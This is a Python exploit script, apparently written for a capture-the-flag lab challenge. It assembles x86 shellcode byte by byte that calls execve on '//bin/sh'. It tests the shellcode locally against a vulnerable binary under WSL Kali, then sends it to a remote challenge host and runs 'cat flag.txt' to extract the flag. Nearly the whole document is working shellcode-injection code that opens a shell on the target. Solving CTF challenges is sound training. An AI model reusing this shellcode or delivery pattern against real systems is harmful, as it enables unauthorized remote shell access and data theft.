import sys, re, time, socket, subprocess
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
CWD = r"C:\Users\arnol\AppData\Local\Temp\cylab_eps"
ins = ["89e7"]
for ch in "//bin/sh":
    ins.append("b0%02x" % ord(ch))
    ins.append("aa90")
ins += ["31c0", "aa90", "89e3", "5090", "5390", "89e1", "31d2", "b00b", "cd80"]
sc = b"".join(bytes.fromhex(i) for i in ins)
print("shellcode:", len(sc), "octets")
open(CWD + r"\in184c.bin", "wb").write(sc + b"\nid; echo PWNED; exit\n")
out = subprocess.run(["wsl", "-d", "kali-linux", "--", "bash", "-c",
                      "cd /mnt/c/Users/arnol/AppData/Local/Temp/cylab_eps && "
                      "(./184_fun < in184c.bin 2>&1 | head -6)"],
                     capture_output=True, text=True).stdout
print("=== local ===")
print(out[:400])
if "PWNED" in out:
    print(">>> shellcode OK, test distant")
    host, port = "xebec.cylabacademy.net", 40339
    s = socket.create_connection((host, port), timeout=15)
    s.settimeout(6)
    time.sleep(0.3)
    try:
        s.recv(200)
    except Exception:
        pass
    s.sendall(sc + b"\n")
    time.sleep(0.5)
    s.sendall(b"cat flag.txt; ls\n")
    res = b""
    t0 = time.time()
    while time.time() - t0 < 8:
        try:
            c = s.recv(8192)
            if not c:
                break
            res += c
        except socket.timeout:
            break
    s.close()
    txt = res.decode("latin-1", "replace")
    print("=== distant ===")
    print(txt[:600])
    m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
    print("FLAG:", m.group(0) if m else None)
